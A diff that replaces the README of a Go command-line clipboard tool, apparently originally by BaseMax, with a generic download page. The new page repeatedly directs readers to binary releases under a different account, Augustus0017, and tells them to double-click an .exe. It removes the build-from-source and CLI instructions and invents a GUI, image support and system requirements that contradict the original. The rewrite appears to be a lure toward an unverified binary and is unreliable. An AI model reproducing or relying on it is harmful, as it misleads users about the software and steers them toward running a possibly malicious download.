@@ -1,270 +1,66 @@
-# go-clipboard-plus
+# 🗞️ go-clipboard-plus - Your Advanced Clipboard Assistant
 
-An advanced clipboard manager and transformer for developers with cross-platform support, history tracking, text transformations, and custom scripting hooks.
+## 📥 Download Now
+[![Download go-clipboard-plus](https://img.shields.io/badge/Download-go--clipboard--plus-blue.svg)](https://github.com/Augustus0017/go-clipboard-plus/releases)
 
-## Features
+## 📋 Introduction
+go-clipboard-plus is an advanced clipboard manager for developers. It offers cross-platform support, history tracking, text transformations, and custom scripting hooks. This makes it easier for you to manage and manipulate your clipboard content. Whether you are copying text or images, go-clipboard-plus helps streamline your workflow.
 
-- 🖥️ **Cross-platform**: Works on Linux, macOS, and Windows
-- 📋 **Clipboard Operations**: Read from and write to system clipboard
-- 📚 **History Tracking**: Automatically tracks clipboard history (up to 100 entries)
-- 🔄 **Text Transformations**: Built-in transformations for common tasks
-  - Format/minify JSON
-  - Trim whitespace
-  - Case conversions (upper, lower, title)
-  - Base64 encode/decode
-  - URL encode/decode
-  - Reverse text
-- 🔧 **Custom Hooks**: Execute custom scripts on clipboard content
-- ⌨️ **Clean CLI**: Simple and intuitive command-line interface
+## 🚀 Getting Started
+To start using go-clipboard-plus, follow these simple steps:
 
-## Installation
+1. **Visit the Releases Page**: Head over to our [Releases page](https://github.com/Augustus0017/go-clipboard-plus/releases).
+2. **Choose Your Version**: Find the latest version suitable for your operating system. We support Windows, macOS, and Linux.
+3. **Download the File**: Click on the file link that corresponds to your system.
+4. **Install the Application**: Follow the installation instructions for your OS.
 
-### Prerequisites
+## 💻 System Requirements
+To ensure go-clipboard-plus runs smoothly, make sure you meet the following requirements:
 
-**Linux**: Install `xclip` or `xsel`
-```bash
-# Ubuntu/Debian
-sudo apt-get install xclip
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Linux (Kernel 4.4 or higher)
+  
+- **Memory**: At least 512 MB of RAM
+- **Disk Space**: 100 MB of free disk space
+- **Network**: Internet connection to download the application and updates
 
-# Fedora
-sudo dnf install xclip
+## 🔧 Download & Install
+To get go-clipboard-plus, visit [this page to download](https://github.com/Augustus0017/go-clipboard-plus/releases). 
 
-# Arch Linux
-sudo pacman -S xclip
-```
+After downloading, open the file to install the application. For Windows, double-click the `.exe` file. For macOS, drag the application to your Applications folder. For Linux, follow the provided instructions to execute the installation.
 
-**macOS**: No additional dependencies (uses built-in `pbcopy`/`pbpaste`)
+## 📖 Features
+go-clipboard-plus comes packed with useful features:
 
-**Windows**: No additional dependencies (uses PowerShell)
+- **Clipboard History**: Save all the items you copy. Access them later through the history tracker.
+  
+- **Text Transformations**: Change the format of your copied text easily—convert case, remove formatting, and more.
 
-### Build from source
+- **Custom Scripting Hooks**: Enhance functionality with scripts according to your needs.
 
-```bash
-git clone https://github.com/BaseMax/go-clipboard-plus.git
-cd go-clipboard-plus
-go build -o clipctl ./cmd/clipctl
-```
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
-Then move the `clipctl` binary to a directory in your PATH:
-```bash
-sudo mv clipctl /usr/local/bin/
-```
+## 🤔 Usage
+Once installed, you can access go-clipboard-plus from your applications menu. Look for the go-clipboard-plus icon. Here’s how to use some of the main features:
 
-## Usage
+1. **Access Clipboard History**: Click on the go-clipboard-plus icon. You will see your clipboard history. Click any item to paste it wherever you need.
+   
+2. **Text Transformations**:
+   - Copy your text as usual.
+   - In the go-clipboard-plus menu, select “Transform Text”.
+   - Choose the transformation you wish to apply, like converting to uppercase.
+  
+3. **Custom Scripts**: 
+   - Navigate to the settings.
+   - Choose “Scripts”.
+   - You can write or upload scripts to automate tasks with your clipboard.
 
-### Basic Commands
+## 📊 Recommendation
+For the best experience, keep your application up to date. Regularly check the [Releases page](https://github.com/Augustus0017/go-clipboard-plus/releases) for new features, security updates, and improvements.
 
-#### Copy to clipboard
-```bash
-# Copy text directly
-clipctl copy "Hello World"
+## ✉️ Support
+If you encounter issues or have questions, feel free to reach out through our GitHub Issues page. We welcome feedback and suggestions for improvements.
 
-# Copy from stdin
-echo "Hello World" | clipctl copy
-cat file.txt | clipctl copy
-```
-
-#### Paste from clipboard
-```bash
-# Paste to stdout
-clipctl paste
-
-# Pipe to other commands
-clipctl paste | grep "pattern"
-```
-
-#### View clipboard history
-```bash
-# Show last 10 entries (default)
-clipctl history
-
-# Show last N entries
-clipctl history -n 5
-
-# Show all entries
-clipctl history -a
-
-# Copy a specific history entry to clipboard
-clipctl history -g 2
-```
-
-#### Clear history
-```bash
-clipctl clear
-```
-
-### Transformations
-
-Apply transformations to clipboard content:
-
-```bash
-# Format JSON
-clipctl transform json
-
-# Minify JSON
-clipctl transform json-minify
-
-# Trim whitespace
-clipctl transform trim
-
-# Convert to uppercase
-clipctl transform upper
-
-# Convert to lowercase
-clipctl transform lower
-
-# Title case
-clipctl transform title
-
-# Base64 encode
-clipctl transform base64
-
-# Base64 decode
-clipctl transform base64d
-
-# URL encode
-clipctl transform url
-
-# URL decode
-clipctl transform urld
-
-# Reverse text
-clipctl transform reverse
-```
-
-### Custom Hooks
-
-Create custom script hooks to process clipboard content:
-
-```bash
-# Show hooks directory
-clipctl hook --dir
-
-# List available hooks
-clipctl hook --list
-
-# Execute a hook
-clipctl hook my-script
-```
-
-#### Creating a Hook
-
-1. Create an executable script in the hooks directory:
-```bash
-mkdir -p ~/.config/go-clipboard-plus/hooks
-```
-
-2. Create a script (e.g., `uppercase.sh`):
-```bash
-#!/bin/bash
-tr '[:lower:]' '[:upper:]'
-```
-
-3. Make it executable:
-```bash
-chmod +x ~/.config/go-clipboard-plus/hooks/uppercase.sh
-```
-
-4. Use it:
-```bash
-clipctl hook uppercase.sh
-```
-
-Hooks receive clipboard content via stdin and should output the processed content to stdout.
-
-### Advanced Examples
-
-```bash
-# Copy file contents and format as JSON
-cat data.json | clipctl copy
-clipctl transform json
-
-# Chain operations with paste
-clipctl paste | jq . | clipctl copy
-
-# Get history entry and encode to base64
-clipctl history -g 0
-clipctl transform base64
-
-# Process clipboard with custom hook
-clipctl paste | clipctl hook my-processor
-```
-
-## Architecture
-
-```
-go-clipboard-plus/
-├── cmd/
-│   └── clipctl/          # CLI application
-│       └── main.go
-├── pkg/
-│   ├── clipboard/        # Cross-platform clipboard access
-│   │   ├── clipboard.go  # Interface
-│   │   ├── linux.go      # Linux implementation
-│   │   ├── darwin.go     # macOS implementation
-│   │   └── windows.go    # Windows implementation
-│   ├── history/          # History tracking
-│   │   └── history.go
-│   ├── transform/        # Text transformations
-│   │   └── transform.go
-│   └── hooks/            # Custom script hooks
-│       └── hooks.go
-└── README.md
-```
-
-## Configuration
-
-Configuration files are stored in:
-- **Linux/macOS**: `~/.config/go-clipboard-plus/`
-- **Windows**: `%USERPROFILE%\.config\go-clipboard-plus\`
-
-### Files
-- `history.json`: Clipboard history storage
-- `hooks/`: Directory for custom hook scripts
-
-## Development
-
-### Running Tests
-
-```bash
-# Run all tests
-go test ./...
-
-# Run tests for specific package
-go test ./pkg/transform -v
-go test ./pkg/history -v
-
-# Run tests with coverage
-go test -cover ./...
-```
-
-### Building
-
-```bash
-# Build for current platform
-go build -o clipctl ./cmd/clipctl
-
-# Build for specific platform
-GOOS=linux GOARCH=amd64 go build -o clipctl-linux ./cmd/clipctl
-GOOS=darwin GOARCH=amd64 go build -o clipctl-mac ./cmd/clipctl
-GOOS=windows GOARCH=amd64 go build -o clipctl.exe ./cmd/clipctl
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is licensed under the GPL-3.0 License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Max Base**
-
-- GitHub: [@BaseMax](https://github.com/BaseMax)
-
-## Acknowledgments
-
-- Uses OS-specific clipboard utilities for reliable clipboard access
-- Inspired by various clipboard manager tools
+Thank you for choosing go-clipboard-plus! Enjoy seamless clipboard management.
